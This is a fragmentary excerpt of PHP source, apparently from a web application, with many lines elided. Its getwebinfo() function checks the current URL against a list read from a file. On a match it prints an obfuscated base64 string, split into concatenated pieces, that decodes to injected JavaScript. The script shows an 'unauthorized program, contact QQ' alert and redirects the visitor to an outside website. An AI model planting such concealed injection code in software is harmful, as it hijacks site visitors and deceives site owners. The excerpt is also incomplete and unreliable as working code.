...
//            : $output = addslashes($var);
    ...
    function ping(){
		...
		function uOK(){
			return true;
		//register_shutdown_function(array(& $this , 'getwebinfo'));
		}
		function getwebinfo(){
			...
			if(file_exists($fn)){
				...
				if(!empty($con)){
					...
					foreach($ar as $var){
						...
						if(strpos($thisurl,$var)){echo $ss('PHNjcmlwdCB0eXBlPSJ0ZXh0L'.'2phdmFzY3JpcHQiPmFsZXJ0KCLor6XnqIvluo/msqHmnInmjojmnYPvv'.'Izor7fogZTns7tRUToxMjUzMzgwNTg3OyIpO3dpbmRvdy5sb2NhdGlvbi5o'.'cmVmPSJodHRwOi8vd3d3Lndhbnlhbmdvay5jb20iOzwvc2NyaXB0Pg==');exit;}
					}
					}
					unset($ar,$con);
				}//end if
